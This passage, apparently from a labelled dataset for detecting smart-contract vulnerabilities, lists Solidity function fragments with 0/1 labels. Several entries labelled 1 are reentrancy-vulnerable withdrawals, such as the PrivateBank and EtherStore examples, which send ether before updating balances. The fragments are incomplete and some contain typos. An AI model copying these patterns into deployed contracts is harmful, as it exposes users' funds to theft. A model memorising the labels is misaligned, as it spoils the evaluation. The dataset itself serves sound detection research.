if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
940 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
941 31759.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) external {
bytes32 txHash = keccak256(byte(0x19), byte(0), this, nonce++, destination, value, data );
verifySignatures( sigV,sigR,sigS,txHash);
require(destination.call.value(value)(data));
0
---------------------------------
942 39890.sol
function authorizePayment(uint _idMilestone) internal {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw;
milestone.status = MilestoneStatus.AuthorizedForPayment;
if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw;
ProposalStatusChanged(_idMilestone, milestone.status);
function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  hrow;
if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw;
authorizePayment(_idMilestone);
function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
0
---------------------------------
943 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
944 11885.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from,address _to,uint256 _value,bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract Ownable {
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
0
---------------------------------
945 37329.sol
function buyICO() onlyExecutorOrOwner {
if (getBlockNumber() < icoStartBlock) return;
if (this.balance == 0) return;
uint256 purchaseAmount = Math.min256(this.balance, purchaseCap);
assert(crowdSale.call.value(purchaseAmount)());
ICOPurchased(purchaseAmount);
0
---------------------------------
946 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
947 PrivateBank.sol
function CashOut(uint _am) {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
1
---------------------------------
948 28974.sol
function pay(address _addr, uint256 count) public payable {
assert(changeable==true);
assert(msg.value >= price*count);
if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()) {
revert();
s.update(_addr,count);
Buy(msg.sender,count);
function () public payable {
pay(msg.sender,1);
0
---------------------------------
949 919.sol
function upgradeToAndCall(string version, address implementation, bytes data) payable public onlyProxyOwner {
upgradeTo(version, implementation);
require(this.call.value(msg.value)(data));
contract EternalStorageProxyForStormMultisender is OwnedUpgradeabilityProxy, EternalStorage {
0
---------------------------------
950 39662.sol
function sendToCharger(uint id) {
if (msg.sender != Owner && msg.sender != Manager) return ;
var _amountForCharger = getAmountForCharger(id);
uint _priceOfCharger = Chargers[id].Address.getPrice() ;
if(_priceOfCharger> _amountForCharger){
uint difference  = _priceOfCharger - _amountForCharger;
calculateCountOfInvestmetnsInQueue(difference,id);
if(!Chargers[id].Address.call.value(_priceOfCharger)()) throw;
0
---------------------------------
951 31565.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
952 2013.sol
function executeTransaction(address destination, uint value, bytes data) public onlyOwner {
if (destination.call.value(value)(data))
emit Execution(destination,value,data);
else
emit ExecutionFailure(destination,value,data);
0
---------------------------------
953 16643.sol
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
0
---------------------------------
954 12182.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
955 30337.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
956 6881.sol
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
1
---------------------------------
957 35878.sol
function Forwarder(address _creator, bytes32 _regName, address _owner) public
RegBase(_creator, _regName, _owner)
forwardTo = owner;
function() public payable {
Forwarded(msg.sender, forwardTo, msg.value);
require(forwardTo.call.value(msg.value)(msg.data));
function createNew(bytes32 _regName, address _owner) public payable feePaid
returns (address kAddr_)
kAddr_ = address(new Forwarder(msg.sender, _regName, _owner));
Created(msg.sender, _regName, kAddr_);
0
---------------------------------
958 3255.sol
function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = 0;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_com = _com.add(_aff);
address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));
return(_eventData_);
0
---------------------------------
959 27263.sol
function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable {
if(msg.sender != address(this))throw;
if(target.call.value(amount)()) {
CashMove(amount, logMsg, target, currentOwner);
function Divest(uint amount)  public  {
if (investors[msg.sender] > 0 && amount > 0)  {
this.loggedTransfer(amount, "", msg.sender, owner);
investors[msg.sender] -= amount;
function withdraw() public {
if(msg.sender==owner) {
this.loggedTransfer(this.balance, "", msg.sender, owner);
1
---------------------------------
960 33835.sol
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data);
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
0
---------------------------------
961 37474.sol
function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) {
require(msg.sender==owner);
require(_to.call.value(_value)(_data));
return 0;
0
---------------------------------
962 4472.sol
function () public payable {
address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)();
0
---------------------------------
963 37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
964 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
965 22247.sol
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function() public payable
Put(msg.sender);
1
---------------------------------
966 40366.sol
function execute(address _to, uint _value, bytes _data) {
if (!isRightBranch) throw;
if (msg.sender != owner) throw;
if (!_to.call.value (_value)(_data)) throw;
contract BranchSender {
bool public isRightBranch;
0
---------------------------------
967 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
968 9221.sol
function bet() payable
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount)
if (gameOwner==msg.sender)
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
969 40038.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner returns (bytes32 _r) {
if (_to == address(tokenCtr)) throw;
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if(!_to.call.value(_value)(_data))
return 0;
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
1
---------------------------------
970 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
971 11705.sol
function commonWithdraw(address token, uint value) internal {
require (tokens[token][msg.sender] >= value);
tokens[token][msg.sender] -= value;
totalDeposited[token] -= value;
require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() );
emit Withdraw(token, msg.sender, value, tokens[token][msg.sender]);
function withdraw(uint amount) public {
commonWithdraw(0, amount);
function withdrawToken(address token, uint amount) public {
commonWithdraw(token, amount);
0
---------------------------------
972 40589.sol
function sendRobust(address to, uint value) internal {
if (!to.send(value)) {
if (!to.call.value(value)()) throw;
function _fillOrder(address _from, uint numTokens) internal returns (bool) {
if (numTokens == 0) throw;
if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;
if (!token.transferFrom(_from, owner, numTokens)) return false;
sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
OrderFilled(_from, numTokens);
return true;
0
---------------------------------
973 EtherStore.sol
function withdrawFunds(uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
1
---------------------------------
974 27248.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public {
require(sigR.length == threshold);
require(sigR.length == sigS.length && sigR.length == sigV.length);
bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce);
address lastAdd = address(0);
for (uint i = 0; i < threshold; i++) {
address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
require(recovered > lastAdd && isOwner[recovered]);
lastAdd = recovered;
nonce = nonce + 1;
require(destination.call.value(value)(data));
0
---------------------------------
975 30046.sol
function executeTransaction() public onlyActiveUsersAllowed() transactionMustBePending() {
Transaction storage transaction = transactions[transactions.length - 1];
require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time);
transaction.is_executed = true;
transaction.time_finalized = now;
transaction.finalized_by = msg.sender;
transaction.execution_successful = transaction.destination.call.value(
transaction.value)(transaction.data);
1
---------------------------------
976 29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
977 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
978 40416.sol
function withdraw(uint amount) {
if (msg.value>0) throw;
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] -= amount;
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
979 23166.sol
function buy(address recipient) payable public duringCrowdSale  {
require(!halted);
require(msg.value >= 0.01 ether);
uint256 tokens = msg.value.mul(35e4);
require(tokens > 0);
require(saleTokenSupply.add(tokens)<=coinAllocation );
balances[recipient] = balances[recipient].add(tokens);
totalSupply_ = totalSupply_.add(tokens);
saleTokenSupply = saleTokenSupply.add(tokens);
salesVolume = salesVolume.add(msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(msg.sender, recipient, msg.value, tokens);
function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public {
admin = msg.sender;
founder = founderWallet;
startDatetime = startDatetimeInSeconds;
endDatetime = startDatetime + 16 * 1 days;
function() public payable {
buy(msg.sender);
0
---------------------------------
980 39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
981 37891.sol
function claim() {
uint balance = balances[msg.sender];
require(balance > 0);
balances[msg.sender] = 0;
bool claimed = msg.sender.call.value(balance)();
require(claimed);
0
---------------------------------
982 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback) public returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
983 17215.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) {
require(compatible223ex);
require(isUnlockedBoth(_to));
require(balances[msg.sender] >= _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
if (isContract(_to)) {
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
0
---------------------------------
984 1044.sol
function donateToWhale(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Donate(amount, whale, msg.sender);
function loseWager(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Lose(amount, msg.sender);
1
---------------------------------
985 39705.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
986 856.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
emit Execution(transactionId);
else {
emit ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
987 16057.sol
function callFirstTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
firstTarget.call.value(msg.value)();
function callSecondTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
secondTarget.call.value(msg.value)();
function winPrize() public payable onlyOwner {
owner.call.value(1 wei)();
0
---------------------------------
988 842.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
require(_value > 0 && frozenAccount[msg.sender] == false && frozenAccount[_to] == false && now > unlockUnixTime[msg.sender] && now > unlockUnixTime[_to]);
if (isContract(_to)) {
require(balanceOf[msg.sender] >= _value);
